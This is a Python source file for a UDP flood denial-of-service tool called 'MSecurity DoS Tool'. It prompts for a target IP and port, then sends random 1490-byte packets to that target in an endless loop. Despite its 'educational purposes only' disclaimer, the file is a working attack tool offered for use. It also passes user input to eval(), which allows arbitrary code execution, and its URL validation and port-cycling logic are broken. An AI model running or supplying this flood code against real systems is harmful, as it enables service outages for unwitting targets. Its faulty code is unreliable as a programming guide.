# Developed by bl3ss902
# For educational purposes only
# DoS and DDoS attack tool, please use it responsibly and ethically.


# Imports
#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError
import colorama

validate = URLValidator()

# Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print(''' 
    |----------------------------------------------|
    |     ┏┳┓┏━┓┏━╸┏━╸╻ ╻┏━┓╻╺┳╸╻ ╻   ╺┳┓┏━┓┏━┓    |
    |     ┃┃┃┗━┓┣╸ ┃  ┃ ┃┣┳┛┃ ┃ ┗┳┛    ┃┃┃ ┃┗━┓    |
    |     ╹ ╹┗━┛┗━╸┗━╸┗━┛╹┗╸╹ ╹  ╹    ╺┻┛┗━┛┗━┛    |
    |            Author: bl3ss902                  |
    |      Dev team: MSecurity, bl3ss902, c1q__    |
    |                                              |
    |                                              |
    |==============================================|    
    |  [!] Disclaimer :                            |
    |  1. Don't Use For Personal Revenges          |
    |  2. Author Is Not Responsible For Your Jobs  |
    |  3. Use for learning purposes                |
    |  4. Use your own responsibility              |
    |  5. Only for educational purposes            |
    |  6. Created for ethical use only             | 
    |==============================================|    
    ''')
# Type your ip and port number ( Finds IP Address using nslookup or any online web)
ip = input("Enter Target IP Address: ")
port = eval(input("Starting Port NO : "))
os.system("clear")
# Loading screen
print('''
    |----------------------------------------------|
    |     ┏┳┓┏━┓┏━╸┏━╸╻ ╻┏━┓╻╺┳╸╻ ╻   ╺┳┓┏━┓┏━┓    |
    |     ┃┃┃┗━┓┣╸ ┃  ┃ ┃┣┳┛┃ ┃ ┗┳┛    ┃┃┃ ┃┗━┓    |
    |     ╹ ╹┗━┛┗━╸┗━╸┗━┛╹┗╸╹ ╹  ╹    ╺┻┛┗━┛┗━┛    |
    |         http Unbearable loading screen...    |
    |      Dev team: MSecurity, bl3ss902, c1q__    |
    |                                              |
    |----------------------------------------------|
   
    ''')

try:
    validate = ip
    print("[+] ✅Target IP Address is valid")
    print(" [+] Attack Screen Loading ....")
except ValidationError as exception :
    print(" [✘] Input a right url address")


# Lets start the attack
print(" ")
print("     Thats's my secret Cap, Im always angry lol... ")
print(" " )
print(" [✘] MSecurity DoS Tool is attacking server " + ip + " on port " + str(port))
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [-] DOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] Exiting... Goodbye! MSecurity DoS Tool On Your Service.")